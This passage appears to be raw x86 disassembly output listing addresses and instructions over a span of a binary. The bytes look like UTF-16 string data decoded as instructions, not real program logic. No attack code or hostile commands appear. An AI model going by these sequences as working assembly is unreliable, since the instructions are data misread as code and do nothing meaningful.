  409184:	add    BYTE PTR [eax+eax*1+0x70],dh
  409188:	add    BYTE PTR [ebp+0x0],dh
  40918b:	je     0x40918d
  40918d:	push   ebx
  40918e:	add    BYTE PTR [eax+eax*1+0x61],dh
  409192:	add    BYTE PTR [edx+0x0],dh
  409195:	je     0x409197
  409197:	imul   eax,DWORD PTR [eax],0x67006e
  40919d:	add    BYTE PTR [ecx],dh
  40919f:	inc    ebx
  4091a0:	add    BYTE PTR [edi+0x0],ch
  4091a3:	ins    BYTE PTR es:[edi],dx
  4091a4:	add    BYTE PTR [eax+eax*1+0x65],ch
  4091a8:	add    BYTE PTR [ebx+0x0],ah
  4091ab:	je     0x4091ad
  4091ad:	imul   eax,DWORD PTR [eax],0x6e006f
  4091b3:	push   ebx
  4091b4:	add    BYTE PTR [eax+eax*1+0x61],dh
  4091b8:	add    BYTE PTR [edx+0x0],dh
  4091bb:	je     0x4091bd
  4091bd:	add    BYTE PTR gs:[eax+eax*1+0x4d],ah
  4091c2:	add    BYTE PTR [ebp+0x0],ah
  4091c5:	jae    0x4091c7
  4091c7:	jae    0x4091c9
  4091c9:	popa   
  4091ca:	add    BYTE PTR [edi+0x0],ah
  4091cd:	add    BYTE PTR gs:[eax],al
  4091d0:	sbb    eax,0x6f0043
  4091d5:	ins    DWORD PTR es:[edi],dx
  4091d6:	add    BYTE PTR [ebp+0x0],ch
  4091d9:	popa   
  4091da:	add    BYTE PTR [esi+0x0],ch
  4091dd:	add    BYTE PTR fs:[ecx+0x0],al
  4091e1:	outs   dx,BYTE PTR ds:[esi]
  4091e2:	add    BYTE PTR [ecx+0x0],ah
  4091e5:	ins    BYTE PTR es:[edi],dx
  4091e6:	add    BYTE PTR [ecx+0x0],bh
  4091e9:	jp     0x4091eb
  4091eb:	add    BYTE PTR gs:[eax],al
  4091ee:	sbb    eax,DWORD PTR [ebx+0x0]
  4091f1:	outs   dx,DWORD PTR ds:[esi]
  4091f2:	add    BYTE PTR [ebp+0x0],ch
  4091f5:	ins    DWORD PTR es:[edi],dx
  4091f6:	add    BYTE PTR [ecx+0x0],ah
  4091f9:	outs   dx,BYTE PTR ds:[esi]
  4091fa:	add    BYTE PTR [eax+eax*1+0x41],ah
  4091fe:	add    BYTE PTR [eax+eax*1+0x74],dh
  409202:	add    BYTE PTR [ecx+0x0],ah
  409205:	arpl   WORD PTR [eax],ax
  409207:	push   0x431b0000
  40920c:	add    BYTE PTR [edi+0x0],ch
  40920f:	ins    DWORD PTR es:[edi],dx
  409210:	add    BYTE PTR [ebp+0x0],ch
  409213:	popa   
  409214:	add    BYTE PTR [esi+0x0],ch
  409217:	add    BYTE PTR fs:[ebx+0x0],al
  40921b:	outs   dx,DWORD PTR ds:[esi]
  40921c:	add    BYTE PTR [esi+0x0],ch
  40921f:	data16 add BYTE PTR [ecx+0x0],ch
  409223:	add    BYTE PTR [bx+si],al
  409226:	sbb    eax,DWORD PTR [ebx+0x0]
  409229:	outs   dx,DWORD PTR ds:[esi]
  40922a:	add    BYTE PTR [ebp+0x0],ch
  40922d:	ins    DWORD PTR es:[edi],dx
  40922e:	add    BYTE PTR [ecx+0x0],ah
  409231:	outs   dx,BYTE PTR ds:[esi]
  409232:	add    BYTE PTR [eax+eax*1+0x44],ah
  409236:	add    BYTE PTR [ebp+0x0],ah
  409239:	je     0x40923b
  40923b:	popa   
  40923c:	add    BYTE PTR [ebx+0x0],ah
  40923f:	push   0x431b0000
  409244:	add    BYTE PTR [edi+0x0],ch
  409247:	ins    DWORD PTR es:[edi],dx
  409248:	add    BYTE PTR [ebp+0x0],ch
  40924b:	popa   
  40924c:	add    BYTE PTR [esi+0x0],ch
  40924f:	add    BYTE PTR fs:[eax+eax*1+0x61],cl
  409254:	add    BYTE PTR [ebp+0x0],dh
  409257:	outs   dx,BYTE PTR ds:[esi]
  409258:	add    BYTE PTR [ebx+0x0],ah
  40925b:	push   0x43230000
  409260:	add    BYTE PTR [edi+0x0],ch
  409263:	ins    DWORD PTR es:[edi],dx
  409264:	add    BYTE PTR [ebp+0x0],ch
  409267:	popa   
  409268:	add    BYTE PTR [esi+0x0],ch
  40926b:	add    BYTE PTR fs:[eax+eax*1+0x61],cl
  409270:	add    BYTE PTR [ebp+0x0],dh
  409273:	outs   dx,BYTE PTR ds:[esi]
  409274:	add    BYTE PTR [ebx+0x0],ah
  409277:	push   0x72004100
  40927c:	add    BYTE PTR [edi+0x0],ah
  40927f:	jae    0x409281
  409281:	add    BYTE PTR [ebx],bl
  409283:	inc    ebx
  409284:	add    BYTE PTR [edi+0x0],ch
  409287:	ins    DWORD PTR es:[edi],dx
  409288:	add    BYTE PTR [ebp+0x0],ch
  40928b:	popa   
  40928c:	add    BYTE PTR [esi+0x0],ch
  40928f:	add    BYTE PTR fs:[edi+0x0],cl
  409293:	jne    0x409295
  409295:	je     0x409297
  409297:	inc    esp
  409298:	add    BYTE PTR [ecx+0x0],ch
  40929b:	jb     0x40929d
  40929d:	add    BYTE PTR ds:0x6f0043,bl
  4092a3:	ins    DWORD PTR es:[edi],dx
  4092a4:	add    BYTE PTR [ebp+0x0],ch
  4092a7:	popa   
  4092a8:	add    BYTE PTR [esi+0x0],ch
  4092ab:	add    BYTE PTR fs:[eax+0x0],dl
  4092af:	jb     0x4092b1
  4092b1:	outs   dx,DWORD PTR ds:[esi]
  4092b2:	add    BYTE PTR [ebx+0x0],ah
  4092b5:	add    BYTE PTR gs:[ebx+0x0],dh
  4092b9:	jae    0x4092bb
  4092bb:	add    BYTE PTR [ecx],bl
  4092bd:	inc    ebx
  4092be:	add    BYTE PTR [edi+0x0],ch
  4092c1:	ins    DWORD PTR es:[edi],dx
  4092c2:	add    BYTE PTR [ebp+0x0],ch
  4092c5:	popa   
  4092c6:	add    BYTE PTR [esi+0x0],ch
  4092c9:	add    BYTE PTR fs:[ecx+0x0],dl
  4092cd:	jne    0x4092cf
  4092cf:	add    BYTE PTR gs:[edx+0x0],dh
  4092d3:	jns    0x4092d5
  4092d5:	add    BYTE PTR [ebx],bh
  4092d7:	inc    esp
  4092d8:	add    BYTE PTR [ebp+0x0],ah
  4092db:	je     0x4092dd
  4092dd:	popa   
  4092de:	add    BYTE PTR [ebx+0x0],ah
  4092e1:	push   0x75004f00
  4092e6:	add    BYTE PTR [eax+eax*1+0x70],dh
  4092ea:	add    BYTE PTR [ebp+0x0],dh
  4092ed:	je     0x4092ef
  4092ef:	inc    esi
  4092f0:	add    BYTE PTR [ecx+0x0],ah
  4092f3:	imul   eax,DWORD PTR [eax],0x4e006c
  4092f9:	outs   dx,DWORD PTR ds:[esi]
  4092fa:	add    BYTE PTR [eax+eax*1+0x43],dh
  4092fe:	add    BYTE PTR [edi+0x0],ch
  409301:	ins    BYTE PTR es:[edi],dx
  409302:	add    BYTE PTR [eax+eax*1+0x65],ch
  409306:	add    BYTE PTR [ebx+0x0],ah
  409309:	je     0x40930b
  40930b:	imul   eax,DWORD PTR [eax],0x67006e
  409311:	add    BYTE PTR ds:0x650044,ch
  409317:	je     0x409319
  409319:	popa   
  40931a:	add    BYTE PTR [ebx+0x0],ah
  40931d:	push   0x75004f00
  409322:	add    BYTE PTR [eax+eax*1+0x70],dh
  409326:	add    BYTE PTR [ebp+0x0],dh
  409329:	je     0x40932b
  40932b:	push   ebx
  40932c:	add    BYTE PTR [eax+eax*1+0x6f],dh
  409330:	add    BYTE PTR [eax+0x0],dh
  409333:	inc    esi
  409334:	add    BYTE PTR [ecx+0x0],ah
  409337:	imul   eax,DWORD PTR [eax],0x65006c
  40933d:	add    BYTE PTR fs:[eax],al
  409340:	daa    
  409341:	inc    esp
  409342:	add    BYTE PTR [ebp+0x0],ah
  409345:	je     0x409347
  409347:	popa   
  409348:	add    BYTE PTR [ebx+0x0],ah
  40934b:	push   0x75004f00
  409350:	add    BYTE PTR [eax+eax*1+0x70],dh
  409354:	add    BYTE PTR [ebp+0x0],dh
  409357:	je     0x409359
  409359:	push   ebx
  40935a:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40935e:	add    BYTE PTR [eax+0x0],dh
  409361:	jo     0x409363
  409363:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  409368:	sub    DWORD PTR [eax+eax*1+0x65],eax
  40936c:	add    BYTE PTR [eax+eax*1+0x61],dh
  409370:	add    BYTE PTR [ebx+0x0],ah
  409373:	push   0x75004f00
  409378:	add    BYTE PTR [eax+eax*1+0x70],dh
  40937c:	add    BYTE PTR [ebp+0x0],dh
  40937f:	je     0x409381
  409381:	push   ebx
  409382:	add    BYTE PTR [eax+eax*1+0x6f],dh
  409386:	add    BYTE PTR [eax+0x0],dh
  409389:	jo     0x40938b
  40938b:	imul   eax,DWORD PTR [eax],0x67006e
  409391:	add    BYTE PTR ds:0x610046,dl
  409397:	je     0x409399
  409399:	popa   
  40939a:	add    BYTE PTR [eax+eax*1+0x45],ch
  40939e:	add    BYTE PTR [edx+0x0],dh
  4093a1:	jb     0x4093a3
  4093a3:	outs   dx,DWORD PTR ds:[esi]
  4093a4:	add    BYTE PTR [edx+0x0],dh
  4093a7:	add    BYTE PTR [edi],bh
  4093a9:	dec    ecx
  4093aa:	add    BYTE PTR [esi+0x0],ch
  4093ad:	jbe    0x4093af
  4093af:	popa   
  4093b0:	add    BYTE PTR [eax+eax*1+0x69],ch
  4093b4:	add    BYTE PTR [eax+eax*1+0x43],ah
  4093b8:	add    BYTE PTR [edi+0x0],ch
  4093bb:	ins    DWORD PTR es:[edi],dx
  4093bc:	add    BYTE PTR [edx+0x0],ah
  4093bf:	imul   eax,DWORD PTR [eax],0x61006e
  4093c5:	je     0x4093c7
  4093c7:	imul   eax,DWORD PTR [eax],0x6e006f
  4093cd:	inc    ebx
  4093ce:	add    BYTE PTR [edi+0x0],ch
  4093d1:	ins    DWORD PTR es:[edi],dx
  4093d2:	add    BYTE PTR [ebp+0x0],ch
  4093d5:	popa   
  4093d6:	add    BYTE PTR [esi+0x0],ch
  4093d9:	add    BYTE PTR fs:[eax+0x0],dl
  4093dd:	popa   
  4093de:	add    BYTE PTR [edx+0x0],dh
  4093e1:	popa   
  4093e2:	add    BYTE PTR [ebp+0x0],ch
  4093e5:	jae    0x4093e7
  4093e7:	add    BYTE PTR ds:0x6e0049,ah
  4093ed:	jbe    0x4093ef
  4093ef:	popa   
  4093f0:	add    BYTE PTR [eax+eax*1+0x69],ch
  4093f4:	add    BYTE PTR [eax+eax*1+0x43],ah
  4093f8:	add    BYTE PTR [edi+0x0],ch
  4093fb:	ins    DWORD PTR es:[edi],dx
  4093fc:	add    BYTE PTR [ebp+0x0],ch
  4093ff:	popa   
  409400:	add    BYTE PTR [esi+0x0],ch
  409403:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  409408:	add    BYTE PTR [esi+0x0],ch
  40940b:	add    BYTE PTR gs:[eax],al
  40940e:	sub    eax,0x6e0049
  409413:	jbe    0x409415
  409415:	popa   
  409416:	add    BYTE PTR [eax+eax*1+0x69],ch
  40941a:	add    BYTE PTR [eax+eax*1+0x4e],ah
  40941e:	add    BYTE PTR [edi+0x0],ch
  409421:	inc    ebx
  409422:	add    BYTE PTR [edi+0x0],ch
  409425:	ins    DWORD PTR es:[edi],dx
  409426:	add    BYTE PTR [ebp+0x0],ch
  409429:	popa   
  40942a:	add    BYTE PTR [esi+0x0],ch
  40942d:	add    BYTE PTR fs:[eax+0x0],dl
  409431:	popa   
  409432:	add    BYTE PTR [edx+0x0],dh
  409435:	popa   
  409436:	add    BYTE PTR [ebp+0x0],ch
  409439:	jae    0x40943b
  40943b:	add    BYTE PTR [ecx],ch
  40943d:	dec    ecx
  40943e:	add    BYTE PTR [esi+0x0],ch
  409441:	jbe    0x409443
  409443:	popa   
  409444:	add    BYTE PTR [eax+eax*1+0x69],ch
  409448:	add    BYTE PTR [eax+eax*1+0x55],ah
  40944c:	add    BYTE PTR [ebx+0x0],dh
  40944f:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  409454:	add    BYTE PTR [ebp+0x0],dh
  409457:	outs   dx,BYTE PTR ds:[esi]
  409458:	add    BYTE PTR [ebx+0x0],ah
  40945b:	push   0x72004100
  409460:	add    BYTE PTR [edi+0x0],ah
  409463:	jae    0x409465
  409465:	add    BYTE PTR [ecx],ch
  409467:	dec    ecx
  409468:	add    BYTE PTR [esi+0x0],ch
  40946b:	jbe    0x40946d
  40946d:	popa   
  40946e:	add    BYTE PTR [eax+eax*1+0x69],ch
  409472:	add    BYTE PTR [eax+eax*1+0x55],ah
  409476:	add    BYTE PTR [ebx+0x0],dh
  409479:	add    BYTE PTR gs:[eax+0x0],dl
  40947d:	jb     0x40947f
  40947f:	outs   dx,DWORD PTR ds:[esi]
  409480:	add    BYTE PTR [ebx+0x0],ah
  409483:	add    BYTE PTR gs:[ebx+0x0],dh
  409487:	jae    0x409489
  409489:	inc    ecx
  40948a:	add    BYTE PTR [edx+0x0],dh
  40948d:	add    BYTE PTR [bx+si],al
  409490:	xor    ecx,DWORD PTR [eax+eax*1+0x61]
  409494:	add    BYTE PTR [ebp+0x0],dh
  409497:	outs   dx,BYTE PTR ds:[esi]
  409498:	add    BYTE PTR [ebx+0x0],ah
  40949b:	push   0x75004f00
  4094a0:	add    BYTE PTR [eax+eax*1+0x70],dh
  4094a4:	add    BYTE PTR [ebp+0x0],dh
  4094a7:	je     0x4094a9
  4094a9:	inc    esi
  4094aa:	add    BYTE PTR [ecx+0x0],ah
  4094ad:	imul   eax,DWORD PTR [eax],0x43006c
  4094b3:	popa   
  4094b4:	add    BYTE PTR [esi+0x0],ch
  4094b7:	je     0x4094b9
  4094b9:	push   ebx
  4094ba:	add    BYTE PTR [eax+eax*1+0x61],dh
  4094be:	add    BYTE PTR [edx+0x0],dh
  4094c1:	je     0x4094c3
  4094c3:	add    BYTE PTR [ecx],ch
  4094c5:	dec    esp
  4094c6:	add    BYTE PTR [ecx+0x0],ah
  4094c9:	jne    0x4094cb
  4094cb:	outs   dx,BYTE PTR ds:[esi]
  4094cc:	add    BYTE PTR [ebx+0x0],ah
  4094cf:	push   0x75004f00
  4094d4:	add    BYTE PTR [eax+eax*1+0x70],dh
  4094d8:	add    BYTE PTR [ebp+0x0],dh
  4094db:	je     0x4094dd
  4094dd:	push   ebx
  4094de:	add    BYTE PTR [eax+eax*1+0x61],dh
  4094e2:	add    BYTE PTR [edx+0x0],dh
  4094e5:	je     0x4094e7
  4094e7:	imul   eax,DWORD PTR [eax],0x67006e
  4094ed:	add    BYTE PTR [edi],ch
  4094ef:	dec    edi
  4094f0:	add    BYTE PTR [ebp+0x0],dh
  4094f3:	je     0x4094f5
  4094f5:	jo     0x4094f7
  4094f7:	jne    0x4094f9
  4094f9:	je     0x4094fb
  4094fb:	inc    ebp
  4094fc:	add    BYTE PTR [edx+0x0],dh
  4094ff:	jb     0x409501
  409501:	outs   dx,DWORD PTR ds:[esi]
  409502:	add    BYTE PTR [edx+0x0],dh
  409505:	push   ebp
  409506:	add    BYTE PTR [esi+0x0],ch
  409509:	popa   
  40950a:	add    BYTE PTR [ebp+0x0],dh
  40950d:	je     0x40950f
  40950f:	push   0x72006f00
  409514:	add    BYTE PTR [ecx+0x0],ch
  409517:	jp     0x409519
  409519:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40951e:	das    
  40951f:	push   eax
  409520:	add    BYTE PTR [ecx+0x0],ah
  409523:	jb     0x409525
  409525:	popa   
  409526:	add    BYTE PTR [ebp+0x0],ch
  409529:	inc    esp
  40952a:	add    BYTE PTR [ebp+0x0],ah
  40952d:	jae    0x40952f
  40952f:	arpl   WORD PTR [eax],ax
  409531:	jb     0x409533
  409533:	imul   eax,DWORD PTR [eax],0x740070
  409539:	imul   eax,DWORD PTR [eax],0x6e006f
  40953f:	inc    ecx
  409540:	add    BYTE PTR [esi+0x0],ch
  409543:	popa   
  409544:	add    BYTE PTR [eax+eax*1+0x79],ch
  409548:	add    BYTE PTR [edx+0x0],bh
  40954b:	add    BYTE PTR gs:[eax],al
  40954e:	sub    eax,0x610050
  409553:	jb     0x409555
  409555:	popa   
  409556:	add    BYTE PTR [ebp+0x0],ch
  409559:	inc    esp
  40955a:	add    BYTE PTR [ebp+0x0],ah
  40955d:	jae    0x40955f
  40955f:	arpl   WORD PTR [eax],ax
  409561:	jb     0x409563
  409563:	imul   eax,DWORD PTR [eax],0x740070
  409569:	imul   eax,DWORD PTR [eax],0x6e006f
  40956f:	inc    ecx
  409570:	add    BYTE PTR [eax+eax*1+0x74],dh
  409574:	add    BYTE PTR [ecx+0x0],ah
  409577:	arpl   WORD PTR [eax],ax
  409579:	push   0x502d0000
  40957e:	add    BYTE PTR [ecx+0x0],ah
  409581:	jb     0x409583
  409583:	popa   
  409584:	add    BYTE PTR [ebp+0x0],ch
  409587:	inc    esp
  409588:	add    BYTE PTR [ebp+0x0],ah
  40958b:	jae    0x40958d
  40958d:	arpl   WORD PTR [eax],ax
  40958f:	jb     0x409591
  409591:	imul   eax,DWORD PTR [eax],0x740070
  409597:	imul   eax,DWORD PTR [eax],0x6e006f
  40959d:	inc    ebx
  40959e:	add    BYTE PTR [edi+0x0],ch
  4095a1:	outs   dx,BYTE PTR ds:[esi]
  4095a2:	add    BYTE PTR [esi+0x0],ah
  4095a5:	imul   eax,DWORD PTR [eax],0x2d000067
  4095ab:	push   eax
  4095ac:	add    BYTE PTR [ecx+0x0],ah
  4095af:	jb     0x4095b1
  4095b1:	popa   
  4095b2:	add    BYTE PTR [ebp+0x0],ch
  4095b5:	inc    esp
  4095b6:	add    BYTE PTR [ebp+0x0],ah
  4095b9:	jae    0x4095bb
  4095bb:	arpl   WORD PTR [eax],ax
  4095bd:	jb     0x4095bf
  4095bf:	imul   eax,DWORD PTR [eax],0x740070
  4095c5:	imul   eax,DWORD PTR [eax],0x6e006f
  4095cb:	inc    esp
  4095cc:	add    BYTE PTR [ebp+0x0],ah
  4095cf:	je     0x4095d1
  4095d1:	popa   
  4095d2:	add    BYTE PTR [ebx+0x0],ah
  4095d5:	push   0x502d0000
  4095da:	add    BYTE PTR [ecx+0x0],ah
  4095dd:	jb     0x4095df
  4095df:	popa   
  4095e0:	add    BYTE PTR [ebp+0x0],ch
  4095e3:	inc    esp
  4095e4:	add    BYTE PTR [ebp+0x0],ah
  4095e7:	jae    0x4095e9
  4095e9:	arpl   WORD PTR [eax],ax
  4095eb:	jb     0x4095ed
  4095ed:	imul   eax,DWORD PTR [eax],0x740070
  4095f3:	imul   eax,DWORD PTR [eax],0x6e006f
  4095f9:	dec    esp
  4095fa:	add    BYTE PTR [ecx+0x0],ah
  4095fd:	jne    0x4095ff
  4095ff:	outs   dx,BYTE PTR ds:[esi]
  409600:	add    BYTE PTR [ebx+0x0],ah
  409603:	push   0x50350000
  409608:	add    BYTE PTR [ecx+0x0],ah
  40960b:	jb     0x40960d
  40960d:	popa   
  40960e:	add    BYTE PTR [ebp+0x0],ch
  409611:	inc    esp
  409612:	add    BYTE PTR [ebp+0x0],ah
  409615:	jae    0x409617
  409617:	arpl   WORD PTR [eax],ax
  409619:	jb     0x40961b
  40961b:	imul   eax,DWORD PTR [eax],0x740070
  409621:	imul   eax,DWORD PTR [eax],0x6e006f
  409627:	dec    esp
  409628:	add    BYTE PTR [ecx+0x0],ah
  40962b:	jne    0x40962d
  40962d:	outs   dx,BYTE PTR ds:[esi]
  40962e:	add    BYTE PTR [ebx+0x0],ah
  409631:	push   0x72004100
  409636:	add    BYTE PTR [edi+0x0],ah
  409639:	jae    0x40963b
  40963b:	add    BYTE PTR ds:0x610050,ch
  409641:	jb     0x409643
  409643:	popa   
  409644:	add    BYTE PTR [ebp+0x0],ch
  409647:	inc    esp
  409648:	add    BYTE PTR [ebp+0x0],ah
  40964b:	jae    0x40964d
  40964d:	arpl   WORD PTR [eax],ax
  40964f:	jb     0x409651
  409651:	imul   eax,DWORD PTR [eax],0x740070
  409657:	imul   eax,DWORD PTR [eax],0x6e006f
  40965d:	dec    edi
  40965e:	add    BYTE PTR [ebp+0x0],dh
  409661:	je     0x409663
  409663:	jo     0x409665
  409665:	jne    0x409667
  409667:	je     0x409669
  409669:	add    BYTE PTR [edi],ch
  40966b:	push   eax
  40966c:	add    BYTE PTR [ecx+0x0],ah
  40966f:	jb     0x409671
  409671:	popa   
  409672:	add    BYTE PTR [ebp+0x0],ch
  409675:	inc    esp
  409676:	add    BYTE PTR [ebp+0x0],ah
  409679:	jae    0x40967b
  40967b:	arpl   WORD PTR [eax],ax
  40967d:	jb     0x40967f
  40967f:	imul   eax,DWORD PTR [eax],0x740070
  409685:	imul   eax,DWORD PTR [eax],0x6e006f
  40968b:	push   eax
  40968c:	add    BYTE PTR [edx+0x0],dh
  40968f:	outs   dx,DWORD PTR ds:[esi]
  409690:	add    BYTE PTR [ebx+0x0],ah
  409693:	add    BYTE PTR gs:[ebx+0x0],dh
  409697:	jae    0x409699
  409699:	add    BYTE PTR [ebx],ch
  40969b:	push   eax
  40969c:	add    BYTE PTR [ecx+0x0],ah
  40969f:	jb     0x4096a1
  4096a1:	popa   
  4096a2:	add    BYTE PTR [ebp+0x0],ch
  4096a5:	inc    esp
  4096a6:	add    BYTE PTR [ebp+0x0],ah
  4096a9:	jae    0x4096ab
  4096ab:	arpl   WORD PTR [eax],ax
  4096ad:	jb     0x4096af
  4096af:	imul   eax,DWORD PTR [eax],0x740070
  4096b5:	imul   eax,DWORD PTR [eax],0x6e006f
  4096bb:	push   ecx
  4096bc:	add    BYTE PTR [ebp+0x0],dh
  4096bf:	add    BYTE PTR gs:[edx+0x0],dh
  4096c3:	jns    0x4096c5
  4096c5:	add    BYTE PTR [ebx],ch
  4096c7:	push   eax
  4096c8:	add    BYTE PTR [ecx+0x0],ah
  4096cb:	jb     0x4096cd
  4096cd:	popa   
  4096ce:	add    BYTE PTR [ebp+0x0],ch
  4096d1:	dec    eax
  4096d2:	add    BYTE PTR [ebp+0x0],ah
  4096d5:	ins    BYTE PTR es:[edi],dx
  4096d6:	add    BYTE PTR [eax+0x0],dh
  4096d9:	push   esi
  4096da:	add    BYTE PTR [ecx+0x0],ah
  4096dd:	ins    BYTE PTR es:[edi],dx
  4096de:	add    BYTE PTR [ebp+0x0],dh
  4096e1:	add    BYTE PTR gs:[ecx+0x0],al
  4096e5:	outs   dx,BYTE PTR ds:[esi]
  4096e6:	add    BYTE PTR [ecx+0x0],ah
  4096e9:	ins    BYTE PTR es:[edi],dx
  4096ea:	add    BYTE PTR [ecx+0x0],bh
  4096ed:	jp     0x4096ef
  4096ef:	add    BYTE PTR gs:[eax],al
  4096f2:	sub    DWORD PTR [eax+0x0],edx
  4096f5:	popa   
  4096f6:	add    BYTE PTR [edx+0x0],dh
  4096f9:	popa   
  4096fa:	add    BYTE PTR [ebp+0x0],ch
  4096fd:	dec    eax
  4096fe:	add    BYTE PTR [ebp+0x0],ah
  409701:	ins    BYTE PTR es:[edi],dx
  409702:	add    BYTE PTR [eax+0x0],dh
  409705:	push   esi
  409706:	add    BYTE PTR [ecx+0x0],ah
  409709:	ins    BYTE PTR es:[edi],dx
  40970a:	add    BYTE PTR [ebp+0x0],dh
  40970d:	add    BYTE PTR gs:[ebx+0x0],al
  409711:	outs   dx,DWORD PTR ds:[esi]
  409712:	add    BYTE PTR [esi+0x0],ch
  409715:	data16 add BYTE PTR [ecx+0x0],ch
  409719:	add    BYTE PTR [bx+si],al
  40971c:	sub    DWORD PTR [eax+0x0],edx
  40971f:	popa   
  409720:	add    BYTE PTR [edx+0x0],dh
  409723:	popa   
  409724:	add    BYTE PTR [ebp+0x0],ch
  409727:	dec    eax
  409728:	add    BYTE PTR [ebp+0x0],ah
  40972b:	ins    BYTE PTR es:[edi],dx
  40972c:	add    BYTE PTR [eax+0x0],dh
  40972f:	push   esi
  409730:	add    BYTE PTR [ecx+0x0],ah
  409733:	ins    BYTE PTR es:[edi],dx
  409734:	add    BYTE PTR [ebp+0x0],dh
  409737:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  40973c:	add    BYTE PTR [ebp+0x0],dh
  40973f:	outs   dx,BYTE PTR ds:[esi]
  409740:	add    BYTE PTR [ebx+0x0],ah
  409743:	push   0x50310000
  409748:	add    BYTE PTR [ecx+0x0],ah
  40974b:	jb     0x40974d
  40974d:	popa   
  40974e:	add    BYTE PTR [ebp+0x0],ch
  409751:	dec    eax
  409752:	add    BYTE PTR [ebp+0x0],ah
  409755:	ins    BYTE PTR es:[edi],dx
  409756:	add    BYTE PTR [eax+0x0],dh
  409759:	push   esi
  40975a:	add    BYTE PTR [ecx+0x0],ah
  40975d:	ins    BYTE PTR es:[edi],dx
  40975e:	add    BYTE PTR [ebp+0x0],dh
  409761:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  409766:	add    BYTE PTR [ebp+0x0],dh
  409769:	outs   dx,BYTE PTR ds:[esi]
  40976a:	add    BYTE PTR [ebx+0x0],ah
  40976d:	push   0x72004100
  409772:	add    BYTE PTR [edi+0x0],ah
  409775:	jae    0x409777
  409777:	add    BYTE PTR [ecx],ch
  409779:	push   eax
  40977a:	add    BYTE PTR [ecx+0x0],ah
  40977d:	jb     0x40977f
  40977f:	popa   
  409780:	add    BYTE PTR [ebp+0x0],ch
  409783:	dec    eax
  409784:	add    BYTE PTR [ebp+0x0],ah
  409787:	ins    BYTE PTR es:[edi],dx
  409788:	add    BYTE PTR [eax+0x0],dh
  40978b:	push   esi
  40978c:	add    BYTE PTR [ecx+0x0],ah
  40978f:	ins    BYTE PTR es:[edi],dx
  409790:	add    BYTE PTR [ebp+0x0],dh
  409793:	add    BYTE PTR gs:[edi+0x0],cl
  409797:	jne    0x409799
  409799:	je     0x40979b
  40979b:	jo     0x40979d
  40979d:	jne    0x40979f
  40979f:	je     0x4097a1
  4097a1:	add    BYTE PTR [ebx],ch
  4097a3:	push   eax
  4097a4:	add    BYTE PTR [ecx+0x0],ah
  4097a7:	jb     0x4097a9
  4097a9:	popa   
  4097aa:	add    BYTE PTR [ebp+0x0],ch
  4097ad:	dec    eax
  4097ae:	add    BYTE PTR [ebp+0x0],ah
  4097b1:	ins    BYTE PTR es:[edi],dx
  4097b2:	add    BYTE PTR [eax+0x0],dh
  4097b5:	push   esi
  4097b6:	add    BYTE PTR [ecx+0x0],ah
  4097b9:	ins    BYTE PTR es:[edi],dx
  4097ba:	add    BYTE PTR [ebp+0x0],dh
  4097bd:	add    BYTE PTR gs:[eax+0x0],dl
  4097c1:	jb     0x4097c3
  4097c3:	outs   dx,DWORD PTR ds:[esi]
  4097c4:	add    BYTE PTR [ebx+0x0],ah
  4097c7:	add    BYTE PTR gs:[ebx+0x0],dh
  4097cb:	jae    0x4097cd
  4097cd:	add    BYTE PTR [ebx],ch
  4097cf:	push   ecx
  4097d0:	add    BYTE PTR [ebp+0x0],dh
  4097d3:	add    BYTE PTR gs:[edx+0x0],dh
  4097d7:	jns    0x4097d9
  4097d9:	dec    edi
  4097da:	add    BYTE PTR [ebp+0x0],dh
  4097dd:	je     0x4097df
  4097df:	jo     0x4097e1
  4097e1:	jne    0x4097e3
  4097e3:	je     0x4097e5
  4097e5:	inc    ebx
  4097e6:	add    BYTE PTR [edi+0x0],ch
  4097e9:	ins    BYTE PTR es:[edi],dx
  4097ea:	add    BYTE PTR [eax+eax*1+0x65],ch
  4097ee:	add    BYTE PTR [ebx+0x0],ah
  4097f1:	je     0x4097f3
  4097f3:	imul   eax,DWORD PTR [eax],0x67006e
  4097f9:	add    BYTE PTR [ecx],ah
  4097fb:	push   ecx
  4097fc:	add    BYTE PTR [ebp+0x0],dh
  4097ff:	add    BYTE PTR gs:[edx+0x0],dh
  409803:	jns    0x409805
  409805:	dec    edi
  409806:	add    BYTE PTR [ebp+0x0],dh
  409809:	je     0x40980b
  40980b:	jo     0x40980d
  40980d:	jne    0x40980f
  40980f:	je     0x409811
  409811:	inc    ebp
  409812:	add    BYTE PTR [edx+0x0],dh
  409815:	jb     0x409817
  409817:	outs   dx,DWORD PTR ds:[esi]
  409818:	add    BYTE PTR [edx+0x0],dh
  40981b:	add    BYTE PTR [ecx],dh
  40981d:	push   ecx
  40981e:	add    BYTE PTR [ebp+0x0],dh
  409821:	add    BYTE PTR gs:[edx+0x0],dh
  409825:	jns    0x409827
  409827:	dec    edi
  409828:	add    BYTE PTR [ebp+0x0],dh
  40982b:	je     0x40982d
  40982d:	jo     0x40982f
  40982f:	jne    0x409831
  409831:	je     0x409833
  409833:	dec    esi
  409834:	add    BYTE PTR [edi+0x0],ch
  409837:	je     0x409839
  409839:	inc    ebx
  40983a:	add    BYTE PTR [edi+0x0],ch
  40983d:	ins    BYTE PTR es:[edi],dx
  40983e:	add    BYTE PTR [eax+eax*1+0x65],ch
  409842:	add    BYTE PTR [ebx+0x0],ah
  409845:	je     0x409847
  409847:	imul   eax,DWORD PTR [eax],0x67006e
  40984d:	add    BYTE PTR [edi],ch
  40984f:	push   ecx
  409850:	add    BYTE PTR [ebp+0x0],dh
  409853:	add    BYTE PTR gs:[edx+0x0],dh
  409857:	jns    0x409859
  409859:	dec    edi
  40985a:	add    BYTE PTR [ebp+0x0],dh
  40985d:	je     0x40985f
  40985f:	jo     0x409861
  409861:	jne    0x409863
  409863:	je     0x409865
  409865:	push   ebx
  409866:	add    BYTE PTR [ebp+0x0],ah
  409869:	jae    0x40986b
  40986b:	jae    0x40986d
  40986d:	imul   eax,DWORD PTR [eax],0x6e006f
  409873:	jae    0x409875
  409875:	inc    edx
  409876:	add    BYTE PTR [ebp+0x0],dh
  409879:	jae    0x40987b
  40987b:	jns    0x40987d
  40987d:	add    BYTE PTR [edi],ch
  40987f:	push   edx
  409880:	add    BYTE PTR [ebp+0x0],ah
  409883:	popa   
